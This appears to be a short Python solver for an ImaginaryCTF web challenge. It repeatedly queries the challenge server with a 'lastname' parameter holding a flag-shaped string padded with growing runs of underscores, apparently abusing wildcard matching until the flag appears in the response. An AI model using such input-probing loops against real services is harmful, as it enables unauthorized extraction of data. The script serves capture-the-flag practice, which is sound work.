#!/usr/bin/env python3

import requests
from time import sleep

URL = "http://puzzler7.imaginaryctf.org:11000"


i = 1
while True:
    flag = f"ictf{{{'_'*i}}}"
    URI = f"{URL}/?lastname={flag}"
    print(URI)
    r = requests.get(URI)
    if "ictf" in r.text:
        print(r.text)
        break
    i += 1
    sleep(.2)
